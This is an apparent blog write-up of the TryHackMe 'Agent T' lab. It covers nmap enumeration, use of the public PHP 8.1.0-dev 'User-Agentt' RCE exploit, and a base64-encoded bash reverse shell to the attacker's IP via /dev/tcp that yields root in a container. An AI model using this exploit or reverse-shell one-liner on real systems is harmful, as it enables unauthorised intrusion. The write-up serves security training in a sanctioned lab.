---
layout: post
title: "Agent T"
date: 2022-08-06
categories: [THM, machine-THM,machine-easy]
image: /assets/img/agentt/agentt.png
---

**Agentt Walkthrough**
# Enumeration
## Portscan
Starting off with nmap
```
nmap -sC -sV -v 10.10.187.122 -oN nmap.txt
```
```
# Nmap 7.92 scan initiated Sun Jul 31 14:00:34 2022 as: nmap -sC -sV -v -oN nmap.txt 10.10.187.122
Increasing send delay for 10.10.187.122 from 0 to 5 due to 19 out of 63 dropped probes since last increase.
Increasing send delay for 10.10.187.122 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.187.122 from 10 to 20 due to 20 out of 66 dropped probes since last increase.
Nmap scan report for 10.10.187.122
Host is up (0.81s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title:  Admin Dashboard

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 31 14:09:34 2022 -- 1 IP address (1 host up) scanned in 539.44 seconds

```
We have port 80 open
## port 80 enumeration
Go to port 80,
With wappalyzer extension on our browser or inspector tool of browser, I found that version of php(PHP 8.1.0-dev) in which it is vulnerable to remote code execution.


You can use offline researching with tool called searchsploit or online researching
```
➜  agentt searchsploit 8.1.0-dev 
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                    | php/webapps/49933.py
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
Online researching,
We got link like -> <a href='https://www.exploit-db.com/exploits/49933'>PHP 8.1.0-dev exploit </a>

Using exploit above and it works for us
```
➜  agentt python3 exploit.py                                                                                                                                             
Enter the full host url:                                                                                                                                                 
http://10.10.187.122/                                                                                                                                                    
Interactive shell is opened on http://10.10.187.122/                                                                                                                     
Can't acces tty; job crontol turned off.                                                                                                                                 
$ ls -la                                                                                                                                                                 
total 760                                                                                                                                                                
drwxr-xr-x 1 root root   4096 Mar  7 22:03 .                                                                                                                             
drwxr-xr-x 1 root root   4096 Mar 30  2021 ..                                                                                                                            
-rw-rw-r-- 1 root root    199 Mar  5 22:33 .travis.yml                                                                                                                   
-rw-rw-r-- 1 root root  22113 Mar  5 22:33 404.html                                          
```
Let get shell
```
$ echo -n L2Jpbi9iYXNoIC1jICdleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xMC40LjY5LjEyMS8xMjM0IDwmMSc=|base64 -d > shell.sh

$ ls -la
total 768
drwxr-xr-x 1 root root   4096 Aug  6 13:17 .
drwxr-xr-x 1 root root   4096 Mar 30  2021 ..
-rw-rw-r-- 1 root root    199 Mar  5 22:33 .travis.yml
-rw-rw-r-- 1 root root  22113 Mar  5 22:33 404.html
-rw-rw-r-- 1 root root  21756 Mar  5 22:33 blank.html
drwxrwxr-x 2 root root   4096 Mar  5 22:33 css
-rw-rw-r-- 1 root root   3784 Mar  5 22:33 gulpfile.js
drwxrwxr-x 2 root root   4096 Mar  5 22:33 img
-rw-rw-r-- 1 root root  42145 Mar  7 21:48 index.php
drwxrwxr-x 3 root root   4096 Mar  5 22:33 js
-rw-rw-r-- 1 root root 642222 Mar  5 22:33 package-lock.json
-rw-rw-r-- 1 root root   1493 Mar  5 22:33 package.json
drwxrwxr-x 4 root root   4096 Mar  5 22:33 scss
-rw-r--r-- 1 root root     59 Aug  6 13:17 shell.sh
drwxrwxr-x 8 root root   4096 Mar  5 22:33 vendor

$ chmod +x shell.sh

$ ./shell.sh

```
We got shell as root but we are in a docker container
```
root@3f8655e43931:/var/www/html# ls -la
total 768
drwxr-xr-x 1 root root   4096 Aug  6 13:17 .
drwxr-xr-x 1 root root   4096 Mar 30  2021 ..
-rw-rw-r-- 1 root root    199 Mar  5 22:33 .travis.yml
-rw-rw-r-- 1 root root  22113 Mar  5 22:33 404.html
-rw-rw-r-- 1 root root  21756 Mar  5 22:33 blank.html
drwxrwxr-x 2 root root   4096 Mar  5 22:33 css
-rw-rw-r-- 1 root root   3784 Mar  5 22:33 gulpfile.js
drwxrwxr-x 2 root root   4096 Mar  5 22:33 img
-rw-rw-r-- 1 root root  42145 Mar  7 21:48 index.php

```
Navigate to /, we found the flag
```
root@3f8655e43931:/# cat flag.txt
cat flag.txt
[REDACTED]
```

